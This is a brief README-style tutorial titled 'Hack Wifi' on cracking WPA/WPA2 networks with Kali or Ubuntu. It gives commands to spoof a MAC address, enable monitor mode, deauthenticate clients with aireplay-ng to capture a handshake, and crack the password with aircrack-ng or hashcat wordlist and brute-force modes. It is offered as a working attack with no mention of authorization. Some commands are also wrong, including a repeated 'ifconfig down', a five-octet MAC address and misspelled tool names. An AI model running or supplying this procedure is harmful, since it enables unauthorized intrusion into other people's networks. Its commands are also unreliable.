# Hack Wifi
hack wifi (wpa2-wpa) with kali or ubuntu
#### new terminal 1
You can change your mac address(Optional)
```
ifconfig wlan0 down
macchanger -m 00:00:00:00:00 wlan0
ifconfig wlan0 down
```
then You have to switch to monitor mode
```
airmon-ng start wlan0
```
#### new terminal 2
look available Wifis
```
airodump wlan0mon
```
#### new terminal 3
attack to get handshake in terminal 2
```
aireplay-ng -0 <60> -a <BSSID> wlan0mon
```
#### final step
after You get handshake in (2)

you can try to crack password
```
aircrack-ng -w <wordlist> -b <BSSID> <handshake file>
```
##### or
you can crack with GPU . its faster and better with hashcat

first convert handshake file
```
airecrack-ng <INP> -J <OUT> #cap to hcap   
```
then
```
hashcat -m 2500 -u 4096 <.hcap file> <wordlist>
```
hashcat manual
```
-a3 #brute force mode

?l=abc...z
?d=012...9
?u=ABC...Z
?s=!#...{}
?a=?l?u?d?s
```
